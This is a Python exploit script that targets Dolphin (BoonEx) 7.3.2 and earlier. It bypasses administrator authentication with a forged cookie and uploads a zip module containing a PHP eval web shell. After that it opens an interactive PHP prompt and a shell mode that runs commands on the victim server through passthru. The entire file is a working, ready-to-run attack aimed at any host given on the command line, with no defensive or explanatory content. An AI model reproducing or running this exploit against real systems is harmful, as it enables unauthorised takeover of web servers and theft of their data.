# -*- coding: utf-8 -*-
&#039;&#039;&#039;
Software : Dolphin <= 7.3.2 Auth bypass / RCE exploit
Vendor : www.boonex.com
Author : Ahmed sultan (0x4148)
Home : 0x4148.com | https://www.linkedin.com/in/0x4148
Email : 0x4148@gmail.com
Auth bypass trick credit go to Saadat Ullah
&#039;&#039;&#039;
import os
import sys
import urllib
import urllib2
import ssl
import base64
print "[+] Dolphin <= 7.3.2 Auth bypass / RCE exploit"
print "[+] Author : Ahmed sultan (0x4148)"
print "[+] Home : 0x4148.com\n"
if len(sys.argv)<2:
    print "\nUsage : python "+sys.argv[0]+" http://HOST/path/\n"
    sys.exit();
hosturl=sys.argv[1]
fields = {&#039;csrf_token&#039;: &#039;Aint give a shit about csrf stuff ;)&#039;, &#039;submit_upload&#039;: &#039;0x4148&#039;}
gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
def generate_http_request(fields):
    lmt = &#039;---------------------------&#039;
    crlf = &#039;\r\n&#039;
    x4148mltprt = []
    x4148mltprt.append(&#039;--&#039; + lmt)
    if fields:
        for (key, value) in fields.items():
            x4148mltprt.append(&#039;Content-Disposition: form-data; name="%s"&#039; % key)
            x4148mltprt.append(&#039;&#039;)
            x4148mltprt.append(value)
            x4148mltprt.append(&#039;--&#039; + lmt)
    x4148mltprt.append(&#039;Content-Disposition: form-data; name="module"; filename="0x4148.zip"&#039;)
    x4148mltprt.append(&#039;Content-Type: application/zip&#039;)
    x4148mltprt.append(&#039;&#039;)
    x4148mltprt.append("PK\x03\x04\x0a\x00\x00\x00\x00\x00RanIj\xf0\xfdU1\x00\x00\x001\x00\x00\x00\x0c\x00\x00\x000x4148fo.php"
    "<?php\x0d\x0aeval(base64_decode($_POST[\&#039;0x4148\&#039;]));\x0d\x0a?>PK\x01\x02\x14\x00\x0a\x00\x00\x00\x00\x00RanIj"
    "\xf0\xfdU1\x00\x00\x001\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x01\x00 \x00\x00\x00\x00\x00\x00\x000x4148fo.php"
    "PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00:\x00\x00\x00[\x00\x00\x00\x00\x00")
    x4148mltprt.append(&#039;--&#039; + lmt + &#039;--&#039;)
    x4148mltprt.append(&#039;&#039;)
    body = crlf.join(x4148mltprt)
    content_type = &#039;multipart/form-data; boundary=%s&#039; % (lmt)
    return content_type, body
content_type, body = generate_http_request(fields)
print " + Sending payload to "+hosturl.split("//")[1].split("/")[0]
req = urllib2.Request(hosturl+"/administration/modules.php",body)
req.add_header(&#039;User-agent&#039;, &#039;Mozilla 15&#039;)
 
req.add_header("Cookie", "memberID=1; memberPassword[]=0x4148;")
req.add_header(&#039;Referer&#039;, hosturl+"/administration/modules.php")
req.add_header(&#039;Content-Type&#039;, content_type)
req.add_header(&#039;Content-Length&#039;, str(len(body)))
req.add_header(&#039;Accept&#039;, &#039;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#039;)
try:
    urllib2.urlopen(req,context=gcontext).read()
except urllib2.HTTPError, e:
    err=e.fp.read()
    print err
    sys.exit()
print " * Checking if payload was send"
data = urllib.urlencode({&#039;0x4148&#039;:&#039;echo "0x4148foooo";&#039;.encode(&#039;base64&#039;)})
req = urllib2.Request(hosturl+&#039;/tmp/0x4148fo.php&#039;, data)
if urllib2.urlopen(req).read().find("0x4148foooo")==-1:
    print " - Exploitation failed"
    print req
    sys.exit()
print " + php prompt up and running\n + type &#039;shell&#039; to get shell access"
while True:
    request=str(raw_input("\nphp>> "))
    if request=="exit":
        sys.exit()
    if request=="shell" or request=="cmd":
        print "\n + Switched to Shell mode\n + Type &#039;return&#039; to return to php prompt mode"
        while True:
            cmd=str(raw_input("\n0x4148@"+hosturl.split("//")[1].split("/")[0]+"# "))
            if cmd=="return":
                break
            if cmd=="exit":
                sys.exit()
            kkk="passthru(&#039;"+cmd+"&#039;);"
            data = urllib.urlencode({&#039;0x4148&#039;:kkk.encode(&#039;base64&#039;)})
            req = urllib2.Request(hosturl+&#039;/tmp/0x4148fo.php&#039;, data)
            print urllib2.urlopen(req).read()
    data = urllib.urlencode({&#039;0x4148&#039;:request.encode(&#039;base64&#039;)})
    req = urllib2.Request(hosturl+&#039;/tmp/0x4148fo.php&#039;, data)
    print urllib2.urlopen(req).read()

